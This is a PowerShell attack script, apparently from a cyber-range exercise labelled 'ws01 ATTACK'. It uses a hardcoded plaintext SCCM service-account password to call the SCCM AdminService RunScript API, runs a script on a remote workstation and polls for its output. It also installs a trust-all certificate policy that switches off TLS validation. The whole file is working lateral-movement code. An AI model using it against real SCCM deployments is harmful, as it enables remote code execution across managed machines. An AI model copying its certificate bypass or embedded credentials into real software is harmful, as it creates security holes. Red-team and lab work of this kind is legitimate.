# WT039: Run approved script on WS01 + poll — analyst_t1 (ws01 ATTACK)
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy15 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy15
$mp = 'mbr02.range.local'
$resourceId = 16777220   # WS01
$guid = 'DE5C9F3D-68F6-446F-88DB-7C0A2770AFCC'
$cred = New-Object System.Management.Automation.PSCredential('range\svc_sccm', (ConvertTo-SecureString 's3rv1c3_SCCM!' -AsPlainText -Force))
$base = "https://$mp/AdminService"

Write-Output "=== WT039 RunScript guid=$guid on WS01 ==="
$runBody = @{ ScriptGuid = $guid } | ConvertTo-Json
try {
  $r3 = Invoke-RestMethod -Uri "$base/v1.0/Device($resourceId)/AdminService.RunScript" -Method Post -Body $runBody -ContentType 'application/json' -Credential $cred -TimeoutSec 30
  $opId = $r3.value
  Write-Output ("[+] OperationId=" + $opId)
} catch {
  $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
  Write-Output ("    RunScript ERROR " + $code + " : " + $_.Exception.Message)
  if ($_.ErrorDetails) { Write-Output ("    detail: " + $_.ErrorDetails.Message) }
  exit 1
}

Write-Output '[+] Polling ScriptResult ...'
$done = $false
for ($i = 1; $i -le 24; $i++) {
  Start-Sleep -Seconds 10
  try {
    $pr = Invoke-RestMethod -Uri "$base/v1.0/Device($resourceId)/AdminService.ScriptResult(OperationId=$opId)" -Credential $cred -TimeoutSec 15
    $result = $pr.value.Result
    if ($result) {
      Write-Output ("[+] RESULT (attempt " + $i + ")")
      $pr | ConvertTo-Json -Depth 6
      $done = $true
      break
    }
    Write-Output ("    attempt " + $i + ": no result yet")
  } catch {
    Write-Output ("    attempt " + $i + ": " + $_.Exception.Message)
  }
}
if (-not $done) { Write-Output '[!] Timed out' }
Write-Output ("WT039_RUN_DONE op=" + $opId)
